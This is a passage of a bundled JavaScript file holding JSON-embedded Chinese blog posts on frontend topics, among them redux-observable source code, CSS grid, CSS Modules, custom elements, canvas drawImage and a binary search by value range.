=&gt;</span> {\\n    <span class=\\"hljs-comment\\">// 此处先截取next(action)</span>\\n    <span class=\\"hljs-keyword\\">const</span> result = next(action);\\n    <span class=\\"hljs-comment\\">// 先执行 stateSubject$.next 可以保证state的更新</span>\\n    stateSubject$.next(store.getState());\\n    <span class=\\"hljs-comment\\">// 操作符按步骤执行，此时的actionSubject$已经绑定了所有的操作符</span>\\n    actionSubject$.next(action);\\n    <span class=\\"hljs-keyword\\">return</span> result;\\n  };\\n};\\n<span class=\\"hljs-comment\\">// run方法，通过epic$的next方法初始化action(见第三)，从而绑定用户自定义的操作符</span>\\nepicMiddleware.run = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">rootEpic</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; !store) {\\n    <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'./utils/console\'</span>).warn(<span class=\\"hljs-string\\">\'epicMiddleware.run(rootEpic) called before the middleware has been setup by redux. Provide the epicMiddleware instance to createStore() first.\'</span>);\\n  }\\n    <span class=\\"hljs-comment\\">// rootEpic就是用户自定义的操作符</span>\\n  epic$.next(rootEpic);\\n};\\n<span class=\\"hljs-keyword\\">return</span> epicMiddleware;\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"operatorsjs\\">operators.js</h3>\\n<p>定义了<code>ofType</code>，其实就是一个filter</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 引入filter</span>\\n<span class=\\"hljs-keyword\\">import</span> { filter } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs/operators\'</span>;\\n<span class=\\"hljs-comment\\">// 这里type就是传给epic的action的type的值，key就是用户自定义需要过滤的值</span>\\n<span class=\\"hljs-keyword\\">const</span> keyHasType = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">type, key</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> type === key || <span class=\\"hljs-keyword\\">typeof</span> key === <span class=\\"hljs-string\\">\'function\'</span> &amp;&amp; type === key.toString();\\n};\\n<span class=\\"hljs-comment\\">// source就是调用ofType的流，也就是createEpicMiddleware里的action$</span>\\n<span class=\\"hljs-comment\\">// 结果只有返回true才会继续链式调用</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> ofType = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...keys</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">source</span>) =&gt;</span> source.pipe(\\n  filter(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">{ type }</span>) =&gt;</span> {\\n    <span class=\\"hljs-keyword\\">const</span> len = keys.length;\\n    <span class=\\"hljs-keyword\\">if</span> (len === <span class=\\"hljs-number\\">1</span>) {\\n      <span class=\\"hljs-keyword\\">return</span> keyHasType(type, keys[<span class=\\"hljs-number\\">0</span>]);\\n    } <span class=\\"hljs-keyword\\">else</span> {\\n      <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>; i &lt; len; i++) {\\n        <span class=\\"hljs-keyword\\">if</span> (keyHasType(type, keys[i])) {\\n          <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>;\\n        }\\n      }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span>;\\n  })\\n);</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"stateobservablejs\\">StateObservable.js</h3>\\n<p>继承<code>Observable</code>，定义了一个保存状态的类，里面改写了父类(<code>Observable</code>)的<code>_subscribe</code>(作用不太清楚)，\\n并且定义了一个保存当前数据状态的函数，通过stateSubject(也就是createEpicMiddleware里面的<code>stateSubject$</code>)的<code>subscribe</code>绑定到底层</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { Observable, Subject } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs\'</span>;\\n\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">StateObservable</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Observable</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(stateSubject, initialState) {\\n    <span class=\\"hljs-comment\\">// 调用父类构造函数，改写父类的_subscribe</span>\\n    <span class=\\"hljs-comment\\">// todo 作用？</span>\\n    <span class=\\"hljs-keyword\\">super</span>(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">subscriber</span> =&gt;</span> {\\n      <span class=\\"hljs-keyword\\">const</span> subscription = <span class=\\"hljs-keyword\\">this</span>.__notifier.subscribe(subscriber);\\n      <span class=\\"hljs-keyword\\">if</span> (subscription &amp;&amp; !subscription.closed) {\\n        subscriber.next(<span class=\\"hljs-keyword\\">this</span>.value);\\n      }\\n      <span class=\\"hljs-keyword\\">return</span> subscription;\\n    });\\n\\n    <span class=\\"hljs-keyword\\">this</span>.value = initialState;\\n     <span class=\\"hljs-keyword\\">this</span>.__notifier = <span class=\\"hljs-keyword\\">new</span> Subject();\\n      <span class=\\"hljs-comment\\">// 绑定一个引用比较的状态函数</span>\\n     <span class=\\"hljs-keyword\\">this</span>.__subscription = stateSubject.subscribe(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">value</span> =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">if</span> (value !== <span class=\\"hljs-keyword\\">this</span>.value) {\\n         <span class=\\"hljs-keyword\\">this</span>.value = value;\\n         <span class=\\"hljs-keyword\\">this</span>.__notifier.next(value);\\n       }\\n     });\\n   }\\n }</code></pre></code></pre>\\n<p>源码就到此分析完了，看到这里可能还是一头雾水，知道是什么也只是概念上的知道，对整个流程还是没有头绪</p>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.redux-observable/README.md\\">查看更多关于流程分析</a></p>\\n","toc":[{"anchor":"yue-du-qian-ti","level":2,"text":"阅读前提"},{"anchor":"mu-lu-jie-gou","level":2,"text":"目录结构"},{"anchor":"yuan-ma-fen-xi","level":2,"text":"源码分析"},{"anchor":"actionobservablejs","level":3,"text":"ActionObservable.js"},{"anchor":"combineepicsjs","level":3,"text":"combineEpics.js"},{"anchor":"createepicmiddlewarejs","level":3,"text":"createEpicMiddleware.js"},{"anchor":"operatorsjs","level":3,"text":"operators.js"},{"anchor":"stateobservablejs","level":3,"text":"StateObservable.js"}],"relatedTags":null,"created_at":"2018-07-31","timeArr":[2018,6,31,0,0,0,0],"title":"从源码理解redux-observable","uuid":"11c12164597745ff2b79b9aa256465683ed63ab6","summary":"<h4>阅读前提：</h4>\\n<ol>\\n<li>有rxjs基础，对<code>Observable</code>, <code>Subject</code>,<code>pipe</code>和一些操作符(例如<code>filter</code>,<code>map</code>,<code>merge</code>,<code>mergeMap</code>)执行流程有基本了解，最起码遇到不清楚有去查阅的动力</li>\\n<li>比较熟悉<code>redux</code>中间件的写法，否则像`createEpicMidd...</li>\\n</ol>","slug":"cong-yuan-ma-li-jie-redux-observable","sha":"6e85cade1d479e41467fc8f31c7cce1b2d0eca18"}')},583:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"charset\\">@charset</h2>\\n<p>@charset 在外部样式表文件内使用。指定该样式表使用的字符编码。</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>@charset &quot;utf-8&quot;;\\nbody {  }\\ndiv {  }</code></pre></code></pre>\\n<h2 id=\\"inline-flex\\">inline-flex</h2>\\n<p>inline-flex和flex 是针对flex容器的内联显示改变，而它内部的flex-item则不受影响</p>\\n<h2 id=\\"grid\\">grid</h2>\\n<ul>\\n<li><p>实现的是box-sizing:border-box效果，无法更改</p>\\n</li>\\n<li><p>grid-template-rows（对应每一行的高度）</p>\\n<p>  <code>grid-template-rows:50px 100px 150px;</code></p>\\n<p>  代表第一行50，第二行100，第三行150</p>\\n</li>\\n<li><p>grid-template-columns（对应每一列的宽度）</p>\\n<p>  <code>grid-template-columns:30px 50px 80px;</code></p>\\n</li>\\n</ul>\\n<p>例如：</p>\\n<p>8个元素列被4条线分割</p>\\n<pre><code><pre class=\\"hljs\\"><code>1  2  3  4\\n|XX|XX|XX|\\n|XX|XX|XX|\\n|XX|XX|  |</code></pre></code></pre><p>通过执行：</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>grid-column-start: 1;\\ngrid-column-end: 3;</code></pre></code></pre>\\n<p>变成如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>XXXXX XX\\nXX XX XX\\nXX XX XX</code></pre></code></pre><p>在线例子<a href=\\"https://codesandbox.io/s/kx657w6lv7\\">https://codesandbox.io/s/kx657w6lv7</a></p>\\n<ul>\\n<li><p>grid-template-area &amp;&amp; grid-area</p>\\n<p>  通过grid-area定义名称</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>  .block1{ grid-area: a; }\\n  .block2{ grid-area: b; }\\n  .block3{ grid-area: c; }\\n  .block4{ grid-area: d; }</code></pre></code></pre>\\n<p>  然后用grid-template-area排列名称，fr 是网格容器剩余空间的等分单位</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>  #container {\\n  box-sizing:content-box;\\n  display: grid;\\n  grid-template-rows:repeat(6,1fr);\\n  grid-template-columns:50px 50px 50px 50px;\\n  grid-template-areas:\\n  &quot;c . a a a .&quot;\\n  &quot;c b b b b b&quot;\\n  &quot;c b b b b b&quot;\\n  &quot;d d d d d d&quot;;\\n  }</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>在线例子<a href=\\"https://codesandbox.io/s/j40102z829\\">https://codesandbox.io/s/j40102z829</a></p>\\n<ul>\\n<li>inline-grid 也是容器变为内联格式</li>\\n</ul>\\n","toc":[{"anchor":"charset","level":2,"text":"@charset"},{"anchor":"inline-flex","level":2,"text":"inline-flex"},{"anchor":"grid","level":2,"text":"grid"}],"relatedTags":null,"created_at":"2018-07-27","timeArr":[2018,6,27,0,0,0,0],"title":"css补缺","uuid":"4f7f64522646a72cae1c94073ca8d665ecf77efd","summary":"<h4>@charset</h4>\\n<p>@charset 在外部样式表文件内使用。指定该样式表使用的字符编码。</p>\\n<pre class=\\"hljs\\"><code>@charset &quot;utf-8&quot;;\\nbody {  }\\ndiv {  }\\n</code></pre>\\n<h4>inline-flex</h4>\\n<p>inline-flex和flex 是针对flex容器的内联显示改变，而它内部的flex-item...</p>","slug":"css-bu-que","sha":"4a1043ffaa6c98e2971a83f9fba138ad8462eafa"}')},584:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"css3-zhong-fu-zhi-fang-shi\\">css3种赋值方式</h2>\\n<ol>\\n<li><code>element.style.name=value</code></li>\\n<li><code>element.style.setProperty(&#39;name&#39;,&#39;value&#39;)</code></li>\\n<li><code>element.style.cssText=&quot;name:value&quot;</code></li>\\n</ol>\\n<p>1和2一次都只能对单个属性赋值，只对name属性赋值，2性能稍微好些</p>\\n<p>3一次可赋值多个属性（减少重排），但注意会先清除内联中其他非赋值属性</p>\\n<h2 id=\\"dong-tai-geng-xin-shi-jian-han-shu\\">动态更新事件函数</h2>\\n<ul>\\n<li>通常写法<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> someEle=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"id\\"</span>)\\n<span class=\\"hljs-comment\\">// 绑定</span>\\nsomeEle.addEventListener(eventName,eventFunc)\\n<span class=\\"hljs-comment\\">// 替换</span>\\nsomeEle.removeEventListener(eventName,eventFunc)\\nsomeEle.addEventListener(eventName,newEventFunc)\\n<span class=\\"hljs-comment\\">// 解绑</span>\\nsomeEle.removeEventListener(eventName,newEventFunc)</code></pre></code></pre>\\n这只是一个元素的事件，当元素或者事件多了，会写很多绑定和解绑代码，\\n而且每次解绑都要去查询之前绑定的函数</li>\\n</ul>\\n<ul>\\n<li>动态更新写法<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 定义动态事件</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">eventListener</span>(<span class=\\"hljs-params\\">event</span>) </span>{\\n<span class=\\"hljs-keyword\\">return</span> event.currentTarget.events[event.type](event)\\n}\\n<span class=\\"hljs-comment\\">// 初始化  </span>\\n<span class=\\"hljs-keyword\\">var</span> someEle=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"id\\"</span>)\\n<span class=\\"hljs-keyword\\">if</span>(!someEle.events){\\nsomeEle.events={}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>// 绑定\\nsomeEle.events[eventName]=eventFunc\\nsomeEle.addEventListener(eventName,eventListener)\\n// 替换\\nsomeEle.events[eventName]=newEventFunc\\n// 解绑\\nsomeEle.removeEventListener(eventName,eventListener)</p>\\n<p>```\\n可以看到，当绑定成功后，每次更新只需要改变数据便可，不需要重新绑定</p>\\n<ul>\\n<li>注意：addEventListener绑定可以同时绑定多个事件函数，而动态绑定单个事件名称只能绑定1个事件函数</li>\\n</ul>\\n","toc":[{"anchor":"css3-zhong-fu-zhi-fang-shi","level":2,"text":"css3种赋值方式"},{"anchor":"dong-tai-geng-xin-shi-jian-han-shu","level":2,"text":"动态更新事件函数"}],"relatedTags":null,"created_at":"2018-06-30","timeArr":[2018,5,30,0,0,0,0],"title":"css3种赋值-动态绑定事件","uuid":"4f4c6e28771908a591c243c12f68d65599bc6d0e","summary":"<h4>css3种赋值方式</h4>\\n<ol>\\n<li><code>element.style.name=value</code></li>\\n<li><code>element.style.setProperty(\'name\',\'value\')</code></li>\\n<li><code>element.style.cssText=&quot;name:value&quot;</code></li>\\n</ol>\\n<p>1和2一次都只能对单个属性赋值，只对name属性赋值，2...</p>","slug":"css3-zhong-fu-zhi-dong-tai-bang-ding-shi-jian","sha":"8e96930475cb06f0123593475430fadf9ed6eec0"}')},585:function(n){n.exports=JSON.parse('{"content":"<p>cssModule配置，先进行webpack配置：</p>\\n<pre><code><pre class=\\"hljs\\"><code>// ...\\ntest: /\\\\.css$/,\\nuse: [\'style-loader\', {\\n  loader: \'css-loader\',\\n  options: {\\n    module: true,\\n    localIdentName: \'[name]-[local]-[hash:base64:5]\'\\n  }\\n}],</code></pre></code></pre><p>localIdentName定义名称的格式</p>\\n<h2 id=\\"ju-bu-he-quan-ju-yang-shi\\">局部和全局样式</h2>\\n<p>当前文件结构：</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---src\\n  |---index.js\\n  |---common.css\\n  ...</code></pre></code></pre><p>在common.css内部</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>/* 局部样式*/\\n.normal{\\n  color:red;\\n}\\n/* 局部样式*/\\n.special{\\n  color:blue;\\n}\\n/* 全局样式，可直接正常使用 .title */\\n:global(.title){\\n    color: green;\\n}\\n</code></pre></code></pre>\\n<p>在index.js内部</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> styles <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./common.css\'</span>\\n\\nsomeEle.className=styles.normal;\\notherEle.className=styles.special;\\nglobalEle.className=<span class=\\"hljs-string\\">\\"title\\"</span>;</code></pre></code></pre>\\n<p>渲染出来的元素类似：</p>\\n<pre><code><pre class=\\"hljs\\"><code>&lt;div class=&quot;common-normal-2vEvb&quot;&gt;...(red color)&lt;/div&gt;\\n&lt;div class=&quot;common-special-1aNtQ&quot;&gt;...(blue color)&lt;/div&gt;\\n&lt;div class=&quot;title&quot;&gt;...(green color)&lt;/div&gt;</code></pre></code></pre><h2 id=\\"composes\\">composes</h2>\\n<p>另外，.css内部使用<code>composes</code>组合样式</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>.base{/* 通用样式*/}\\n.case1{\\n  composes:base;\\n  /* 其他样式*/\\n}</code></pre></code></pre>\\n","toc":[{"anchor":"ju-bu-he-quan-ju-yang-shi","level":2,"text":"局部和全局样式"},{"anchor":"composes","level":2,"text":"composes"}],"relatedTags":null,"created_at":"2018-06-17","timeArr":[2018,5,17,0,0,0,0],"title":"cssModule","uuid":"0c2b37a7633e1d040b742bc9653e1a42eef51f8c","summary":"<p>cssModule配置，先进行webpack配置：</p>\\n<pre class=\\"hljs\\"><code>// ...\\ntest: /\\\\.css$/,\\nuse: [\'style-loader\', {\\n  loader: \'css-loader\',\\n  options: {\\n    module: true,\\n    localIdentName: \'[name]-...</code></pre>","slug":"cssModule","sha":"6ccea1616a61dc321481094dcb50899b11c98624"}')},586:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"custom-elements\\">custom elements</h3>\\n<p>作用：将HTML页面的功能封装为<code>custom elements</code>(自定义标签)</p>\\n<blockquote>\\n<p><code>shadow root</code>：渲染隔离</p>\\n</blockquote>\\n<h3 id=\\"api\\">API</h3>\\n<ul>\\n<li><p>customElement.define()</p>\\n<p>  定义一个新的 自定义元素。</p>\\n<p>  参数1：<code>name</code>自定义元素名.\\n  参数2：<code>constructor</code>自定义元素构造器.\\n  参数3：<code>options</code> 目前有一个选项支持:<code>extends</code>指定继承的已创建的元素. 被用于创建自定义元素.\\n  例如：<code>{extends:&#39;p&#39;}继承p元素</code>，构造组件时<code>class MyEle extends HTMLParagraphElement{...}</code></p>\\n<blockquote>\\n<p>Autonomous custom elements 总是继承自HTMLElement</p>\\n</blockquote>\\n</li>\\n<li><p>customElement.get()</p>\\n<p>  返回指定自定义元素的构造函数，如果未定义自定义元素，则返回undefined。</p>\\n</li>\\n<li><p>customElement.whenDefined()</p>\\n<p>  返回当使用给定名称定义自定义元素时(必须使用有效名称)将会执行的promise(无参数)。</p>\\n<blockquote>\\n<p>有效的名称：<code>[a-z]xx-xxx</code>\\n具体参考:<a href=\\"https://html.spec.whatwg.org/multipage/custom-elements.html#prod-pcenchar\\">https://html.spec.whatwg.org/multipage/custom-elements.html#prod-pcenchar</a></p>\\n</blockquote>\\n<p>  例子：</p>\\n<pre><code><pre class=\\"hljs\\"><code>  customElements.whenDefined(&quot;my-ele&quot;).then(()=&gt;{\\n    // 此处无参数传递\\n    console.log(&quot;defined&quot;)\\n  })\\n  class MyEle extends HTMLElement {\\n    constructor() {\\n      // 必须首先调用 super方法 \\n      super(); \\n      // 元素的功能代码写在这里\\n    }\\n  }\\n  customElements.define(\'my-ele\', MyEle );</code></pre></code></pre></li>\\n</ul>\\n<h3 id=\\"da-pei-shadow-root-xiao-li-zi\\">搭配<code>shadow root</code>小例子</h3>\\n<pre><code><pre class=\\"hljs\\"><code>class MyEle extends HTMLElement {\\n  constructor() {\\n    super(); \\n    // 启动shadowRoot\\n    var shadow = this.attachShadow({mode: \'open\'});\\n\\n    var wrapper = document.createElement(\'span\');\\n    wrapper.setAttribute(\'class\',\'wrapper\');\\n    const style = document.createElement(\'style\');\\n    style.textContent = `\\n      .wrapper {\\n        background:blue;\\n      }\\n    `\\n    shadow.appendChild(wrapper);\\n  }\\n}\\ncustomElements.define(\'my-ele\', MyEle);</code></pre></code></pre><p>此处定义了一个<code>custom Element</code>，(包括启动<code>shadowRoot</code>和<code>define</code>)，其内部的<code>.wrapper</code>背景是蓝色，与外部的<code>.wrapper</code>不冲突。</p>\\n<h2 id=\\"sheng-ming-zhou-qi\\">生命周期</h2>\\n<ul>\\n<li>connectedCallback：当<code>custom element</code>首次被插入文档DOM时，被调用。</li>\\n<li>disconnectedCallback：当<code>custom element</code>从文档DOM中删除时，被调用。</li>\\n<li>adoptedCallback：当<code>custom element</code>被移动到新的文档时，被调用。</li>\\n<li>attributeChangedCallback:(多次被调用) 当<code>custom element</code>增加、删除、修改自身属性时，被调用。</li>\\n</ul>\\n","toc":[{"anchor":"custom-elements","level":3,"text":"custom elements"},{"anchor":"api","level":3,"text":"API"},{"anchor":"da-pei-shadow-root-xiao-li-zi","level":3,"text":"搭配<code>shadow root</code>小例子"},{"anchor":"sheng-ming-zhou-qi","level":2,"text":"生命周期"}],"relatedTags":null,"created_at":"2018-12-06","timeArr":[2018,11,6,0,0,0,0],"title":"customElements简述-笔记","uuid":"b921517a71d6975276b0a16acc18047667769321","summary":"<h4>custom elements</h4>\\n<p>作用：将HTML页面的功能封装为<code>custom elements</code>(自定义标签)</p>\\n<blockquote>\\n<p><code>shadow root</code>：渲染隔离</p>\\n</blockquote>\\n<h4>API</h4>\\n<ul>\\n<li>\\n<p>customElement.define()</p>\\n<p>定义一个新的 自定义元素。</p>\\n<p>参数1：<code>name</code>自定义...</p>\\n</li>\\n</ul>","slug":"customElements-jian-shu-bi-ji","sha":"a05dffbbc1c300934bccf6d802d61ea2a8458807"}')},587:function(n){n.exports=JSON.parse('{"content":"<p>canvas的drawImage方法组多可以有9个参数，如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>void ctx.drawImage(image, dx, dy);\\nvoid ctx.drawImage(image, dx, dy, dWidth, dHeight);\\nvoid ctx.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);</code></pre></code></pre><p>第三种使用的参数理解：</p>\\n<ul>\\n<li>dx：用于显示的窗口位置x</li>\\n<li>dy：用于显示的窗口位置y</li>\\n<li>dWidth：用于显示的窗口宽度</li>\\n<li>dHeight：用于显示的窗口高度</li>\\n<li>sx：用于显示的画的位置x</li>\\n<li>sy：用于显示的画的位置y</li>\\n<li>sWidth：用于显示的画的宽度</li>\\n<li>sHeight：用于显示的画的高度</li>\\n</ul>\\n<p>可以看成2张画布，外面的一张通过<code>d</code>参数对其开窗口\\n里面的一张是画，通过<code>s</code>参数对其裁剪</p>\\n<p>例如：</p>\\n<p><code>sx=0,sy=0,sw=1,sh=1</code></p>\\n<p>说明从<code>[0,0]</code>开始裁减了<code>1*1</code>的图像</p>\\n<p><code>dx=0,dy=0,dw=100,dh=100</code></p>\\n<p>说明从<code>[0,0]</code>开始，开了一个<code>100*100</code>的窗口</p>\\n<p>最后将裁剪的图像填满窗口，也就是宽高都放大了100倍</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-03","timeArr":[2018,8,3,0,0,0,0],"title":"drawImage的9个参数","uuid":"0dd0d60aa80404051e5b01683717fd83676f1c68","summary":"<p>canvas的drawImage方法组多可以有9个参数，如下：</p>\\n<pre class=\\"hljs\\"><code>void ctx.drawImage(image, dx, dy);\\nvoid ctx.drawImage(image, dx, dy, dWidth, dHeight);\\nvoid ctx.drawImage(image, sx, sy, sWi...</code></pre>","slug":"drawImage-de-9-ge-can-shu","sha":"9037842d9026af5c37a1ba0eca58e9071b5903e3"}')},588:function(n){n.exports=JSON.parse('{"content":"<p>对比了map和hashTable对数据存取的性能，key类型为string</p>\\n<p>测试方法：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// CODES是字符串组成的数组</span>\\n\\n<span class=\\"hljs-comment\\">// map</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n      <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n      <span class=\\"hljs-keyword\\">if</span>(!m.has(i))m.set(i,<span class=\\"hljs-number\\">1</span>)\\n      <span class=\\"hljs-keyword\\">else</span> m.set(i,m.get(i)+<span class=\\"hljs-number\\">1</span>)\\n    }\\n  }\\n\\n<span class=\\"hljs-comment\\">// hashTable {}</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n    <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n    <span class=\\"hljs-keyword\\">if</span>(!c[i])c[i]=<span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">else</span> c[i]++\\n  }\\n}</code></pre></code></pre>\\n<p>测试结果</p>\\n<pre><code><pre class=\\"hljs\\"><code>map:           hashTable:         \\n22,755         7,502          \\n±0.52%         ±0.65%         \\nfastest        67% slower              </code></pre></code></pre><p>测试地址:<a href=\\"https://jsperf.com/hanktest-map-vs-hashtable\\">https://jsperf.com/hanktest-map-vs-hashtable</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-21","timeArr":[2018,7,21,0,0,0,0],"title":"对比map,{},[]的存取效率","uuid":"80cda11f9e18b118723c11b54a629d2ce4a71c79","summary":"<p>对比了map和hashTable对数据存取的性能，key类型为string</p>\\n<p>测试方法：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// CODES是字符串组成的数组</span>\\n\\n<span class=\\"hljs-comment\\">// map</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n      <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n   ...</code></pre>","slug":"dui-bi-map-{}-[]-de-cun-qu-xiao-lv","sha":"d2b8968488e3098bc8d6a318374cc0b57ab9511d"}')},589:function(n){n.exports=JSON.parse('{"content":"<p>通常二分查找算法是根据index进行查找，并且要求数据结构是已排序的。</p>\\n<p>这里记录一个未排序的二分查找</p>\\n<p>题目：在一个数组arr中，找出从小到大第n个的数字</p>\\n<p>例如：<code>[6,3,8,1,4,7]</code>，找出第3位，结果是4</p>\\n<p>使用排序也可以解决，当空间有限制时，时间复杂度是<code>O(N*lgN)</code>，<del>但二分查找的范围法可以控制到</del><code>O(N)</code>，二分也是<code>O(nlgn)</code></p>\\n<p>使用<code>快速选择</code>能达到<code>O(n)</code>，最坏<code>O(n^2)</code>，具体代码在<code>2019-1-18</code></p>\\n<p>思路是不断缩小查找范围直到范围长度为1，这时所在的位置就是对应的位数</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getSpecificNum</span>(<span class=\\"hljs-params\\">arr,k</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 找出最大最小值</span>\\n  <span class=\\"hljs-keyword\\">let</span> lo=<span class=\\"hljs-literal\\">Infinity</span>,hi=-<span class=\\"hljs-literal\\">Infinity</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(arr[i]&lt;lo)lo=arr[i]\\n    <span class=\\"hljs-keyword\\">if</span>(arr[i]&gt;hi)hi=arr[i]\\n  }\\n  <span class=\\"hljs-comment\\">// 缩小范围</span>\\n  <span class=\\"hljs-keyword\\">while</span>(lo&lt;hi){\\n    <span class=\\"hljs-keyword\\">let</span> mid=<span class=\\"hljs-built_in\\">Math</span>.floor((lo+hi)/<span class=\\"hljs-number\\">2</span>)\\n    <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n      <span class=\\"hljs-keyword\\">if</span>(arr[i]&lt;=mid)count++\\n    }\\n    <span class=\\"hljs-keyword\\">if</span>(count&gt;=k)hi=mid\\n    <span class=\\"hljs-keyword\\">else</span> lo=mid+<span class=\\"hljs-number\\">1</span>\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> lo\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-11","timeArr":[2018,8,11,0,0,0,0],"title":"二分查找的range方法","uuid":"5ba1422eb5748f36ae6b36980b06e537d336b746","summary":"<p>通常二分查找算法是根据index进行查找，并且要求数据结构是已排序的。</p>\\n<p>这里记录一个未排序的二分查找</p>\\n<p>题目：在一个数组arr中，找出从小到大第n个的数字</p>\\n<p>例如：<code>[6,3,8,1,4,7]</code>，找出第3位，结果是4</p>\\n<p>使用排序也可以解决，当空间有限制时，时间复杂度是<code>O(N*lgN)</code>，~~但二分查找的范围法可以控...</p>","slug":"er-fen-cha-zhao-de-range-fang-fa","sha":"bcaa51d3db66e9c67d11b14a85afe0fed30faf07"}')},590:function(n){n.exports=JSON.parse('{"content":"<p>箭头函数()=&gt;{},没有自己的this指针,this为上一层的的this指针</p>\\n<p>function(){},有自己的this指针,this指向调用时的对象</p>\\n<p>例子：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>a=<span class=\\"hljs-string\\">\\"windowScope\\"</span>\\n<span class=\\"hljs-keyword\\">let</span> obj1={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-comment\\">// 向上找不到this指针，指向window</span>\\n  